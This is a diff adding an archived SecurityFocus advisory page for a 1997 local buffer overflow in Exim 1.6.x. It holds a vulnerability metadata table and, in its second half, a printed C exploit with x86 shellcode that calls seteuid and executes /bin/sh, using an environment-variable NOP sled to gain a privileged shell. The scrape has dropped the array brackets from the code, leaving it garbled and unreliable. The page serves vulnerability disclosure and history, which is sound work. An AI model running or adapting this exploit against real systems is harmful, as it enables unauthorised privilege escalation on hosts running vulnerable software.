@@ -1,0 +1,104 @@
+#bid1859<p><b><span style="font-size: 18pt;">Exim Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1859/info">info</a><br><a href="http://www.securityfocus.com/bid/1859/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1859/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1859/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1859/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1859
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 21 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 21 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was reported to bugtraq by D. J. Bernstein &lt;djb@koobera.math.uic.edu&gt; 
+Two patches supplied by Philip Hazel.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					University of Cambridge Exim 1.6.51 <br/>
+					
+				
+					University of Cambridge Exim 1.6.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					University of Cambridge Exim 3.0 x<br/>
+					
+				
+					University of Cambridge Exim 2.0 x<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Exploit provided by D. J. Bernstein &lt;djb@koobera.math.uic.edu&gt; <br/><br/>/* sample code for one OS/compiler combination; ./this ./exim -bt you */<br/><br/>char code = {<br/>  0x31,0xc0 /* eax = 0 */<br/>, 0x50 /* push eax */<br/>, 0xbb,0x98,0x30,0x04,0x00 /* ebx = 0x43098; &amp;seteuid in my copy of exim */<br/>, 0xff,0xd3 /* call ebx */<br/>, 0x31,0xc0<br/>, 0x50<br/>, 0xb8,0x9a,0xd1,0x03,0x00 /* eax = 0x3d19a; &amp;"/bin/sh" in my copy of exim */<br/>, 0x50<br/>, 0x50<br/>, 0xbb,0xf8,0x29,0x04,0x00 /* ebx = 0x429f8; &amp;execl in my copy of exim */<br/>, 0xff,0xd3<br/>, 0x00 /* just to terminate the last string in the environment */<br/>} ;<br/><br/>char buf1000;<br/>char *env1001;<br/><br/>void main(argc,argv)<br/>int argc;<br/>char **argv;<br/>{<br/>  int i;<br/>  int j;<br/><br/>  for (i = 0;i &lt; sizeof buf;++i) bufi = 0x90; /* nop */<br/>  memcpy(buf + sizeof buf - sizeof code,code,sizeof code);<br/><br/>  j = 0;<br/>  env0 = buf;<br/>  for (i = 0;i &lt; sizeof buf;++i) if (!bufi) env++j = buf + i + 1;<br/>  envj = 0;<br/><br/>  if (argv1) execve(argv1,argv + 1,env);<br/>  exit(1);<br/>}
+	
+		<ul>
+</ul>
+</div>
